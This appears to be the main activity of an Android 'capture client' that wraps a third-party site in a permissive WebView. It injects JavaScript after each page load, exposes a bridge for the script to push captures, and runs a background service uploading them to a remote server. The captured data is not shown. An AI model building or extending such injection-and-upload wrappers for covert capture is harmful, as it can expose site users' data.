package com.knt.captureclient

import android.annotation.SuppressLint
import android.os.Build
import android.os.Bundle
import android.webkit.*
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import java.util.UUID

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView

    companion object {
        // ---- change these ----
        const val TARGET_URL = "https://dkwin7.com"
        const val SERVER_URL = "https://knt-capture-server.onrender.com"
        const val INGEST_TOKEN = "knt-capture-CHANGE-THIS-9f2b7c3d4e"
        // ----------------------
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // prep prefs
        Prefs.init(this)
        if (Prefs.deviceId.isNullOrEmpty()) {
            Prefs.deviceId = UUID.randomUUID().toString().replace("-", "").take(16)
        }

        // start uploader service (foreground)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(android.content.Intent(this, UploadService::class.java))
        } else {
            startService(android.content.Intent(this, UploadService::class.java))
        }

        // WebView
        webView = WebView(this)
        setContentView(webView)

        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            mediaPlaybackRequiresUserGesture = false
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = userAgentString + " KNTCapture/1.0"
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                JsInjector.inject(view ?: return, TARGET_URL)
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(cm: ConsoleMessage): Boolean {
                android.util.Log.d("KNT-WV", "${cm.message()} @${cm.lineNumber()}")
                return true
            }
        }

        // add JS bridge so page-side JS can push captures to Kotlin
        webView.addJavascriptInterface(CaptureBridge(this), "KNTBridge")

        webView.loadUrl(TARGET_URL)
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }
}
